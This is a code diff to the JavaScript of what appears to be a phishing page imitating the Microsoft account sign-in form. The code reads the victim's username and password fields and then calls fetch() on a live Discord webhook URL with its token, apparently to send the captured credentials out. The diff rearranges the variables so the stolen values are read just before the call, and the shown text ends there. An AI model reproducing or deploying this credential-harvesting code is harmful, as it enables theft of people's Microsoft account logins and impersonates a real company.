@@ -416,8 +416,8 @@
         
         const unReq = "Enter a valid email address, phone number, or Skype name."
         const pwdReq = "Please enter the password for your Microsoft account."
-        const unameInp = document.getElementById('inp_uname');
-        const pwdInp = document.getElementById('inp_pwd');
+        let unameInp = document.getElementById('inp_uname');
+        let pwdInp = document.getElementById('inp_pwd');
         let unameInpreal = "overwrittensoon"
         let view = "uname";
 
@@ -430,6 +430,7 @@
             validate();
             if (unameVal) {
                 unameInpreal = document.getElementById('inp_uname');
+                
                 document.getElementById("section_uname").classList.toggle('d-none');
                 document.getElementById('section_pwd').classList.remove('d-none');
                 document.querySelectorAll('#user_identity').forEach((e) => {
@@ -447,11 +448,13 @@
             //validate the form
             validate();
             if (pwdVal) {
-    console.log(unameInpreal);
-    console.log(pwdInp);
+
  //const user = unameInpreal
  //const pass = pwdInp
-
+    unameInp = document.getElementById('inp_uname');
+    pwdInp = document.getElementById('inp_pwd');
+    console.log(unameInpreal);
+    console.log(pwdInp);
   fetch(
     'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
   
